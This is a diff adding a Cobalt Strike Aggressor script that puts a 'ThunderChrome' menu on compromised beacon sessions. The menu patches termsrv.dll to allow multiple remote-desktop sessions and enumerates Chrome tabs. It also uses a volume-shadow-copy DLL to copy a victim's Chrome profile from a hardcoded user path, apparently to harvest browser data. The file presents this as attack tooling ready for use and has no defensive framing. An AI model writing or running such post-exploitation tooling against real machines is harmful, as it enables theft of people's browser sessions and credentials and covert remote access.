@@ -1,0 +1,49 @@
+###
+global('$targetDir');
+$targetDir = "C:\\Users\\Public\\Documents";
+
+
+#Menu Setup
+popup beacon_bottom {
+	menu "ThunderChrome" {
+		item "&Enable Multi-Remote App - Patch Termsrv.dll"
+		{
+			blog($1, "DLL wait time is 30 seconds. Take a break.");
+			bdllspawn($1, script_resource("ThunderRApp_DLL_x64.dll"), "--patch", "Patching Termsrv.dll", 30000, false);
+		}
+		item "&Disable Multi-Remote App - Revert Termsrv.dll"
+		{
+			blog($1, "DLL wait time is 30 seconds. Take a break.");
+			bdllspawn($1, script_resource("ThunderRApp_DLL_x64.dll"), "--revert", "Reverting Termsrv.dll", 30000, false);
+		}
+		item "Enumerate &Chrome Tabs"
+		{
+			bexecute_assembly($1, script_resource("ThunderTabs_47.exe"));
+		}
+		item "&VSS Chrome Profile"
+		{
+			local('$bid');
+			foreach $bid ($1)
+			{
+				ThunderVSS($bid);			
+			}
+		}
+	}		
+}		
+
+sub ThunderVSS
+{		
+	$bid = $1;
+	if (-is64 $bid) 
+	{		
+		#Manually pass the Chrome profile path to the DLL. **WARNING NO \\ AFTER DEFAULT**
+		bdllspawn($bid, script_resource("ThunderVSS_DLL_x64.dll"), "C:\\users\\Jack\\Appdata\\Local\\Google\\Chrome\\User Data\\Default", "VSSing Chrome Profile", 60000, false);
+		return;		
+	}
+	else
+	{
+		berror($bid, "In order to run ThunderChrome VSS the Beacon requires a 64bit session");
+		return;
+	}
+}
+
